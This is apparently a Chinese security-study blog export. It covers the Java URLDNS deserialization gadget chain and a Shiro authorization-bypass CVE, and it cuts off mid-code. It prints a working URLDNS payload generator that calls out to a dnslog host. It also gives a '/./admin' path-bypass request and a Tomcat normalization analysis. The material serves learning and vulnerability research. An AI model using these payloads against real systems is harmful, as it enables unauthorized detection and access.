<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>传入的是<strong>URL</strong>对象，所以跟进<strong>URL</strong>对象中的<strong>hashCode</strong>方法，先会判断<strong>hashCode</strong>是否等于<strong>-1</strong>，然后再调用<strong>URLStreamHandler</strong>的<strong>hashCode</strong>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>hashCode</strong>方法再调用了<strong>getHostAddress</strong>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进，可以看见其调用了<strong>getByName</strong>方法，其描述是<strong>Determines
the IP address of a host, given the host's
name</strong>，即为一次<strong>DNS</strong>请求，返回<strong>IP</strong>地址。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用栈如下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getByName:<span class="number">1076</span>, InetAddress (java.net)</span><br><span class="line">getHostAddress:<span class="number">436</span>, URLStreamHandler (java.net)</span><br><span class="line">hashCode:<span class="number">353</span>, URLStreamHandler (java.net)</span><br><span class="line">hashCode:<span class="number">885</span>, URL (java.net)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br></pre></td></tr></table></figure>
<h1 id="exploit生成">Exploit生成</h1>
<h2 id="摘自天下大木头"><a
href="https://mp.weixin.qq.com/s/KZI5ntTSrWH-lYxoJg6jDQ">摘自天下大木头</a></h2>
<p>对生成<strong>Exploit</strong>来说，使用<strong>put</strong>方法存入数据时，也会调用<strong>putVal</strong>方法。</p>
<p>因此在生成<strong>Exploit</strong>时就会发起一次<strong>DNS</strong>请求，最好规避一下。</p>
<p>回到<strong>hashCode</strong>方法，看见一开始有一个对值的判断，如果不等于<strong>-1</strong>，则直接返回。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>故可通过反射来修改<strong>URL</strong>中的<strong>hashCode</strong>，在调用<strong>put</strong>方法前后修改<strong>hashCode</strong>即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://a4ungz.dnslog.cn/&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clas</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clas.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(url, <span class="number">233</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;233&quot;</span>);</span><br><span class="line">        field.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./urldns&quot;</span>));</span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./urldns&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="摘自ysoserial"><a
href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">摘自ysoserial</a></h2>
<p><strong>ysoserial</strong>中，创建了<strong>SilentURLStreamHandler</strong>类来构造<strong>URL</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使得在调用<strong>putVal</strong>时，调用的是<strong>SilentURLStreamHandler</strong>类的<strong>getHostAddress</strong>方法，返回的是<strong>null</strong>，故不会触发<strong>DNS</strong>请求。</p>
<p>以及将其标记为<strong>transient</strong>，使得其不被序列化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br></pre></td></tr></table></figure>
<h1 id="refer">Refer</h1>
<p><a
href="https://mp.weixin.qq.com/s/KZI5ntTSrWH-lYxoJg6jDQ"><strong>Java</strong>反序列化-<strong>URLDNS</strong></a></p>
<p><a
href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java"><strong>ysoserial</strong></a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Java</tag>
        <tag>Unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析 Shiro 未授权 CVE</title>
    <url>/Study-Unauthorized-Shiro/</url>
    <content><![CDATA[<p>浅跟一下。</p>
<span id="more"></span>
<h1 id="request-方法的差异性">request 方法的差异性</h1>
<table>
<colgroup>
<col style="width: 19%" />
<col style="width: 52%" />
<col style="width: 28%" />
</colgroup>
<thead>
<tr class="header">
<th>方法</th>
<th>描述</th>
<th>值</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>request.getPathInfo</td>
<td>仅返回传递到<strong>Servlet</strong>的路径，如果没有传递额外的路径信息，则此返回<strong>NULL</strong></td>
<td>/test</td>
</tr>
<tr class="even">
<td>request.getContextPath</td>
<td>返回工程名部分，如果工程映射为<strong>/</strong>，则返回为空</td>
<td></td>
</tr>
<tr class="odd">
<td>request.getServletPath</td>
<td>返回除去<strong>Host</strong>和工程名部分的路径</td>
<td>/admin</td>
</tr>
<tr class="even">
<td>request.getRequestURI</td>
<td>返回除去<strong>Host</strong>部分的路径</td>
<td>/admin/test</td>
</tr>
<tr class="odd">
<td>request.getRequestURL</td>
<td>返回全路径</td>
<td>http://localhost:9090/admin/test</td>
</tr>
</tbody>
</table>
<h1 id="tomcat-的请求转换与映射">Tomcat 的请求转换与映射</h1>
<p>首先 <strong>Tomcat</strong> 会先处理 <strong>HTTP</strong>
请求，检查起合法性后映射请求到
<strong>MappingData</strong>，然后再执行引擎的反射判断路由最终调用匹配的方法。</p>
<p>而在映射的过程中，<strong>normalize</strong>
方法进行了很多的格式化操作，诸如替换 <strong>/./</strong> 为空。</p>
<h2 id="调用栈">调用栈</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">normalize:1212, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">postParseRequest:652, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:351, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:382, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:65, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:893, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1723, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:750, Thread (java.lang)</span><br></pre></td></tr></table></figure>
<h3 id="postparserequest">postParseRequest</h3>
<p>首先是 <strong>CoyoteAdapter</strong> 类的
<strong>postParseRequest</strong> 方法，调用 <strong>normalize</strong>
进行标准化判断。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CoyoteAdapter (org.apache.catalina.connector)</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">postParseRequest</span><span class="params">(org.apache.coyote.Request req, Request request, org.apache.coyote.Response res, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="comment">// Normalization</span></span><br><span class="line">    <span class="keyword">if</span> (normalize(req.decodedURI())) &#123;</span><br><span class="line">        <span class="comment">// Character decoding</span></span><br><span class="line">        convertURI(decodedURI, request);</span><br><span class="line">        <span class="keyword">if</span> (!checkNormalize(req.decodedURI())) &#123;</span><br><span class="line">            response.sendError(<span class="number">400</span>, <span class="string">&quot;Invalid URI&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        response.sendError(<span class="number">400</span>, <span class="string">&quot;Invalid URI&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="normalize">normalize</h3>
<p><strong>normalize</strong> 方法匹配到 <strong>/.</strong> 结尾的
<strong>URI</strong>，末尾添加 <strong>/</strong>，然后截断，因此当
<strong>URI</strong> 为 <strong>/admin/.</strong> 时，先处理为
<strong>/admin/./</strong> ，然后替换为空得到
<strong>/admin/</strong>，但此时并没有直接赋值，而是进行了
<strong>setEnd</strong> 操作，标记了结束位。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CoyoteAdapter (org.apache.catalina.connector)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">normalize</span><span class="params">(MessageBytes uriMB)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteChunk</span> <span class="variable">uriBC</span> <span class="operator">=</span> uriMB.getByteChunk();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] b = uriBC.getBytes();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> uriBC.getStart();</span><br><span class="line">    <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> uriBC.getEnd();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An empty URL is not acceptable</span></span><br><span class="line">    <span class="keyword">if</span> (start == end) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replace &#x27;\&#x27; with &#x27;/&#x27;</span></span><br><span class="line">    <span class="comment">// Check for null byte</span></span><br><span class="line">    <span class="keyword">for</span> (pos = start; pos &lt; end; pos++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (b[pos] == (<span class="type">byte</span>) <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ALLOW_BACKSLASH) &#123;</span><br><span class="line">                b[pos] = (<span class="type">byte</span>) <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (b[pos] == (<span class="type">byte</span>) <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The URL must start with &#x27;/&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (b[start] != (<span class="type">byte</span>) <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replace &quot;//&quot; with &quot;/&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (pos = start; pos &lt; (end - <span class="number">1</span>); pos++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (b[pos] == (<span class="type">byte</span>) <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> ((pos + <span class="number">1</span> &lt; end) &amp;&amp; (b[pos + <span class="number">1</span>] == (<span class="type">byte</span>) <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                copyBytes(b, pos, pos + <span class="number">1</span>, end - pos - <span class="number">1</span>);</span><br><span class="line">                end--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the URI ends with &quot;/.&quot; or &quot;/..&quot;, then we append an extra &quot;/&quot;</span></span><br><span class="line">    <span class="comment">// Note: It is possible to extend the URI by 1 without any side effect</span></span><br><span class="line">    <span class="comment">// as the next character is a non-significant WS.</span></span><br><span class="line">    <span class="keyword">if</span> (((end - start) &gt;= <span class="number">2</span>) &amp;&amp; (b[end - <span class="number">1</span>] == (<span class="type">byte</span>) <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((b[end - <span class="number">2</span>] == (<span class="type">byte</span>) <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">            || ((b[end - <span class="number">2</span>] == (<span class="type">byte</span>) <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">                &amp;&amp; (b[end - <span class="number">3</span>] == (<span class="type">byte</span>) <span class="string">&#x27;/&#x27;</span>))) &#123;</span><br><span class="line">            b[end] = (<span class="type">byte</span>) <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">            end++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uriBC.setEnd(end);</span><br><span class="line"></span><br><span class="line">    index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Resolve occurrences of &quot;/./&quot; in the normalized path</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        index = uriBC.indexOf(<span class="string">&quot;/./&quot;</span>, <span class="number">0</span>, <span class="number">3</span>, index);</span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        copyBytes(b, start + index, start + index + <span class="number">2</span>,</span><br><span class="line">                  end - start - index - <span class="number">2</span>);</span><br><span class="line">        end = end - <span class="number">2</span>;</span><br><span class="line">        uriBC.setEnd(end);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Resolve occurrences of &quot;/../&quot; in the normalized path</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        index = uriBC.indexOf(<span class="string">&quot;/../&quot;</span>, <span class="number">0</span>, <span class="number">4</span>, index);</span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Prevent from going outside our context</span></span><br><span class="line">        <span class="keyword">if</span> (index == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index2</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (pos = start + index - <span class="number">1</span>; (pos &gt;= <span class="number">0</span>) &amp;&amp; (index2 &lt; <span class="number">0</span>); pos --) &#123;</span><br><span class="line">            <span class="keyword">if</span> (b[pos] == (<span class="type">byte</span>) <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                index2 = pos;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        copyBytes(b, start + index2, start + index + <span class="number">3</span>,</span><br><span class="line">                  end - start - index - <span class="number">3</span>);</span><br><span class="line">        end = end + index2 - index - <span class="number">3</span>;</span><br><span class="line">        uriBC.setEnd(end);</span><br><span class="line">        index = index2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="converturi">convertURI</h3>
<p>如果 <strong>normalize</strong> 的合法性校验通过，此时才会调用
<strong>convertURI</strong> 方法，完成 <strong>URI</strong>
的标准化操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CoyoteAdapter (org.apache.catalina.connector)</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">convertURI</span><span class="params">(MessageBytes uri, Request request)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteChunk</span> <span class="variable">bc</span> <span class="operator">=</span> uri.getByteChunk();</span><br><span class="line">    <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> bc.getLength();</span><br><span class="line">    <span class="type">CharChunk</span> <span class="variable">cc</span> <span class="operator">=</span> uri.getCharChunk();</span><br><span class="line">    cc.allocate(length, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Charset</span> <span class="variable">charset</span> <span class="operator">=</span> connector.getURICharset();</span><br><span class="line"></span><br><span class="line">    <span class="type">B2CConverter</span> <span class="variable">conv</span> <span class="operator">=</span> request.getURIConverter();</span><br><span class="line">    <span class="keyword">if</span> (conv == <span class="literal">null</span>) &#123;</span><br><span class="line">        conv = <span class="keyword">new</span> <span class="title class_">B2CConverter</span>(charset, <span class="literal">true</span>);</span><br><span class="line">        request.setURIConverter(conv);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        conv.recycle();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        conv.convert(bc, cc, <span class="literal">true</span>);</span><br><span class="line">        uri.setChars(cc.getBuffer(), cc.getStart(), cc.getLength());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">        <span class="comment">// Should never happen as B2CConverter should replace</span></span><br><span class="line">        <span class="comment">// problematic characters</span></span><br><span class="line">        request.getResponse().sendError(HttpServletResponse.SC_BAD_REQUEST);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="map">map</h3>
<p>返回标准化的 <strong>URI</strong> 之后，<strong>Tomcat</strong>
开始使用 <strong>map</strong> 方法处理映射。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Mapper (org.apache.catalina.mapper)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(MessageBytes host, MessageBytes uri, String version,</span></span><br><span class="line"><span class="params">                MappingData mappingData)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (host.isNull()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">defaultHostName</span> <span class="operator">=</span> <span class="built_in">this</span>.defaultHostName;</span><br><span class="line">        <span class="keyword">if</span> (defaultHostName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        host.getCharChunk().append(defaultHostName);</span><br><span class="line">    &#125;</span><br><span class="line">    host.toChars();</span><br><span class="line">    uri.toChars();</span><br><span class="line">    internalMap(host.getCharChunk(), uri.getCharChunk(), version, mappingData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="internalmapwrapper">internalMapWrapper</h3>
<p><strong>map</strong> 调用 <strong>internalMap</strong> ，然后继续调用
<strong>internalMapWrapper</strong>，在
<strong>internalMapWrapper</strong> 中对 <strong>mappingData</strong>
的成员变量 <strong>wrapperPath</strong> 进行了 <strong>setChars</strong>
赋值操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Mapper (org.apache.catalina.mapper)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">internalMapWrapper</span><span class="params">(ContextVersion contextVersion, CharChunk path, MappingData mappingData)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (contextVersion.defaultWrapper != <span class="literal">null</span>) &#123;</span><br><span class="line">        mappingData.wrapper = contextVersion.defaultWrapper.object;</span><br><span class="line">        mappingData.requestPath.setChars(path.getBuffer(), path.getStart(), path.getLength());</span><br><span class="line">        mappingData.wrapperPath.setChars(path.getBuffer(), path.getStart(), path.getLength());</span><br><span class="line">        mappingData.matchType = MappingMatch.DEFAULT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="cve-2010-3863">CVE-2010-3863</h1>
<h2 id="漏洞简介">漏洞简介</h2>
<p>影响版本：<strong>shiro &lt; 1.1.0</strong></p>
<p>漏洞描述：<strong>Shiro</strong> 没有处理
<strong>/./</strong>，<strong>Spring Controller</strong>
处理了，因为这样对 <strong>URL</strong>
解析的不同操作，匹配到不同的过滤链，导致权限绕过。</p>
<p>测试环境：<strong>1.0.0-incubating</strong>，<strong>SpringBoot
2.2.6.RELEASE</strong></p>
<h2 id="漏洞分析">漏洞分析</h2>
<p>配置如下。</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.properties</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">9090</span></span><br></pre></td></tr></table></figure>
<p>路由如下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">ShiroFilterFactoryBean <span class="title function_">shiroFilterFactoryBean</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">    bean.setSecurityManager(securityManager());</span><br><span class="line">    bean.setLoginUrl(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    bean.setSuccessUrl(<span class="string">&quot;/index&quot;</span>);</span><br><span class="line">    bean.setUnauthorizedUrl(<span class="string">&quot;/unauthorizedurl&quot;</span>);</span><br><span class="line">    Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;/doLogin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;/admin/**&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    bean.setFilterChainDefinitionMap(map);</span><br><span class="line">    <span class="keyword">return</span> bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>HTTP</strong> 请求如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET http://127.0.0.1:9090/./admin/whoami</span><br></pre></td></tr></table></figure>
<h3 id="绕过">/./ 绕过</h3>
<h4 id="shiro-处理部分">Shiro 处理部分</h4>
<h5 id="getchain">getChain</h5>
<p><strong>getChain</strong> 调用
<strong>getPathWithinApplication</strong> 获取 <strong>URI</strong> 为
<strong>/./admin/whoami</strong>，然后 <strong>for</strong> 循环匹配到
<strong>/**</strong> 而不是 <strong>/admin/**</strong>，而后
<strong>proxy</strong> 根据 <strong>/**</strong> 获取
<strong>anno</strong> 路由。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> FilterChain <span class="title function_">getChain</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain originalChain)</span> &#123;</span><br><span class="line">    <span class="type">FilterChainManager</span> <span class="variable">filterChainManager</span> <span class="operator">=</span> getFilterChainManager();</span><br><span class="line">    <span class="keyword">if</span> (!filterChainManager.hasChains()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">requestURI</span> <span class="operator">=</span> getPathWithinApplication(request);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//the &#x27;chain names&#x27; in this implementation are actually path patterns defined by the user.  We just use them</span></span><br><span class="line">    <span class="comment">//as the chain name for the FilterChainManager&#x27;s requirements</span></span><br><span class="line">    <span class="keyword">for</span> (String pathPattern : filterChainManager.getChainNames()) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If the path does match, then pass on to the subclass implementation for specific checks:</span></span><br><span class="line">        <span class="keyword">if</span> (pathMatches(pathPattern, requestURI)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                log.trace(<span class="string">&quot;Matched path pattern [&quot;</span> + pathPattern + <span class="string">&quot;] for requestURI [&quot;</span> + requestURI + <span class="string">&quot;].  &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Utilizing corresponding filter chain...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> filterChainManager.proxy(originalChain, pathPattern);</span><br><span class="line">        &#125;</span><br><span class="line">    